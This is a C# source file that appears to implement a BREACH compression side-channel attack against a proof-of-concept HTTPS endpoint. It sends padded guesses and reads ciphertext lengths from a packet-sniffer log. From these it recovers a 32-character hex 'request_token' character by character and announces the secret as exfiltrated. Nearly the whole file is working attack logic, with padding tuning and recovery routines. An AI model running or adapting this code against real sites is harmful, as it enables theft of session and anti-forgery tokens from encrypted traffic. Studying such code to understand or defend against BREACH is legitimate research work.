using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace BREACHBasic
{
    partial class Program
    {
        // User-configurable parameters
        static Char[] KeySpace = new Char[] { 
            '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'
        };

        // Sample, non-authenticated HTTPS-enabled endpoint vulnerable to BREACH
        static string TargetURL = "https://malbot.net/poc/?param1=";
        static string canary = "request_token='";

        // Internal parameters
        static string PacketRealTimeLog = Path.Combine(Path.GetTempPath(), "readBytesRealTime.txt");
        static string knownToken = String.Empty;
        static int lastFrameRead = 0;
        static int NumberOfRequests = 0;

        // Default padding (airbags) configuration values
        static int PADDING_SIZE = 40; // Default
        static int PADDING_SIZE_ADJUSTMENT = 0;
        static int PADDING_TOP = 300 - PADDING_SIZE;
        static int PADDING_BOTTOM = 20 - PADDING_SIZE;

        // Main Driver
        static void Main(string[] args)
        {
            // If requirements do not pass, exit
            if (!CheckRequirements()) return;

            Stopwatch stopWatch = new Stopwatch();

            int AirbagExpansions = 0;
            bool ForceRecoveryMode = false;

            // Initialize
            HttpGet(TargetURL + "&Initialize");
            DeletePacketLog();
            stopWatch.Start();

            do
            {
                char? winner = null; // winner candidate
                bool knownBad = false; // known false positive
                ArrayList blackListedIntelligence = new ArrayList(16); // list of known false positives

                // Initial keyspace probing 
                foreach (char c in KeySpace)
                {
                    if (ForceRecoveryMode)
                        break;
                    if (c.ToString() == "b")
                    {
                        var test = "";
                    }
                    // Provided only one guess has better compression that its peers, we accept it
                    if (IsCorrectGuess(canary + knownToken, c.ToString(), ref knownBad))
                    {
                        WriteConsoleSuccess("[>] The winner is... " + c);

                        if (winner != null)
                        {
                            WriteConsoleError("\n[!] FIRST ROUND COLLISION - We already had a winner!! (" + winner + " vs. " + c + ")");
                            WriteConsoleWarning("Forcing recovery mode.\n");

                            winner = null;
                            ForceRecoveryMode = true;
                            break;
                        }

                        else
                        {
                            winner = c;
                        }
                    }

                    if (knownBad)
                    {
                        blackListedIntelligence.Add(c);
                    }
                }

                // If we didn't find a winner -or found too many-, try different padding sizes
                if (winner == null && AirbagExpansions < 5)
                {
                    Random myRandom = new Random();
                    PADDING_SIZE_ADJUSTMENT = myRandom.Next(PADDING_BOTTOM, PADDING_TOP);

                    WriteConsoleInfo("[ Brief Airbag Expansion (#" + (AirbagExpansions + 1) + " @ " + (PADDING_SIZE + PADDING_SIZE_ADJUSTMENT) + ") ]");
                    AirbagExpansions++;
                    continue;
                }


                // Additional *BASIC* recovery mechanisms
                // This will probe 2 characters at a time (n x n)
                if (winner == null)
                {
                    WriteConsoleError("\n[!] We could not locate a winner");
                    WriteConsoleWarning("Initiating recovery procedure #1...\n");


                    foreach (char c in KeySpace)
                    {
                        foreach (char d in KeySpace) // could we optimize this loop? break
                        {
                            if (blackListedIntelligence.Contains(d))
                            {
                                Console.Write("  ... " + d + " ... ");
                                continue;
                            }

                            bool knownBad2 = false;
                            if (winner == null &&
                                IsCorrectGuess(canary + knownToken, d.ToString() + c.ToString(), ref knownBad2))
                            {
                                WriteConsoleSuccess("[>>] The winner is... " + d);
                                winner = d;
                            }
                        }
                    }

                }

                // If we found a winner, we continue with the next character
                if (winner != null)
                {
                    knownToken += winner;
                    AirbagExpansions = 0;
                    PADDING_SIZE_ADJUSTMENT = 0;
                    Console.Title = knownToken;
                }

                Console.WriteLine("\n--- --- ---\n");

            } while (knownToken.Length < 32);


            WriteConsoleSuccess("\n\n\n ------------- GREAT SUCCESS WITH " + NumberOfRequests + " REQUESTS --------------- " +
                        "\n Secret Exfiltrated (" + stopWatch.Elapsed.Minutes + "m " + stopWatch.Elapsed.Seconds.ToString("D2") + "s) : " + knownToken + "\n");
            Console.Title = "SSL Exfiltration Services...  " + knownToken + " (" + NumberOfRequests + ")";

            Console.ReadLine();
        }


        // The Oracle
        public static bool IsCorrectGuess(
            String currentCanary,
            String guess,
            ref bool knownBad)
        {
            knownBad = false;
            String padding = String.Empty;
            for (int i = 0; i <= (PADDING_SIZE + PADDING_SIZE_ADJUSTMENT) / 2; i++)
                padding += "-";

            HttpGet(TargetURL + currentCanary + guess + padding + "@");
            int? bytes1 = ReadBytes();

            HttpGet(TargetURL + currentCanary + padding + guess + "@");
            int? bytes2 = ReadBytes();

            Console.WriteLine("Byte Check: byte1: " + bytes1 + " byte2: " + bytes2);

            // If something went wrong with this read, retry one time
            if (bytes1 == null || bytes2 == null || Math.Abs(bytes1.Value - bytes2.Value) > 100)
            {
                HttpGet(TargetURL + currentCanary + guess + padding + "@");
                bytes1 = ReadBytes();

                HttpGet(TargetURL + currentCanary + padding + guess + "@");
                bytes2 = ReadBytes();
            }

            // If bytes1 is smaller than bytes2, we have a winner
            if (bytes1 < bytes2)
            {
                Console.WriteLine("bytes1: " + bytes1 + " ... bytes2: " + bytes2 + " [" + guess + "]");
                return true;
            }

            // Otherwise this is clearly a false positive
            else if (bytes2 < bytes1)
                knownBad = true;

            return false;
        }


        // Reads the ciphertext response length
        public static int? ReadBytes()
        {
            int errorCount = 0;

            while (!File.Exists(PacketRealTimeLog))
            {
                if (++errorCount % 100 == 0)
                    WriteConsoleError("·· CANNOT READ BYTES FAST ENOUGH - (ERR #001)");

                Thread.Sleep(1);
            }

            do
            {
                try
                {
                    // Read from real-time streaming packet log
                    using (StreamReader sr = new StreamReader(File.OpenRead(PacketRealTimeLog)))
                    {
                        int allLength = 0;
                        int packetsRead = 0;
                        bool readingStarted = false;
                        bool readingComplete = false;

                        string allPackets = sr.ReadToEnd();
                        sr.Close();

                        // If we haven't read the log before, set the last known frame to the first line
                        if (lastFrameRead == 0)
                        {
                            String[] tkns = allPackets.Trim().Split(new char[] { '\r', '\n' });
                            lastFrameRead = Int32.Parse(tkns[0].Split(new char[] { ' ' })[0]) - 1;
                        }

                        int previousLastFrameRead = lastFrameRead;

                        // Parse every line in the log
                        foreach (string s in allPackets.Split(new char[] { '\r', '\n' }))
                        {
                            if (!String.IsNullOrEmpty(s))
                            {
                                bool isDelimiter = (s.Split(new char[] { ' ' })[0] == "---");
                                if (!isDelimiter)
                                {
                                    int frameNumber = Int32.Parse(s.Split(new char[] { ' ' })[0]);

                                    if (frameNumber > lastFrameRead)
                                    {
                                        packetsRead++;
                                        allLength += Int32.Parse(s.Split(new char[] { ' ' })[1]);
                                        lastFrameRead = frameNumber;
                                        readingStarted = true;
                                    }
                                }
                                else // delimiter
                                {
                                    if (readingStarted)
                                    {
                                        readingComplete = true;
                                        break;
                                    }
                                }
                            }
                        }

                        if (readingComplete || allLength > 0)
                        {
                            return allLength;
                        }
                        else
                        {
                            if ((++errorCount % 500 == 0) &&
                                (errorCount > 10000 && knownToken.Length > 0 || errorCount > 20000))
                            {
                                WriteConsoleError("·· CANNOT READ BYTES FAST ENOUGH - (ERR #002)");
                                return null;
                            }

                            // Try again
                            lastFrameRead = previousLastFrameRead;
                            continue;
                        }
                    }
                }
                catch (IOException)
                {
                    if (++errorCount % 500 == 0)
                    {
                        WriteConsoleError("·· TOO MANY I/O EXCEPTIONS CAPTURED - (ERR #003)");
                        Thread.Sleep(10);
                    }
                }

            } while (true);

        }
        


        // Resets the log between BREACH and the SSL Relay Proxy / packet sniffer
        public static void DeletePacketLog()
        {
            do
            {
                try
                {
                    File.Delete(PacketRealTimeLog);
                    break;
                }
                catch (IOException)
                {
                    WriteConsoleWarning("## ERR - Cannot delete packet length log");
                    Thread.Sleep(5);
                }
            } while (true);
        }

    }
}
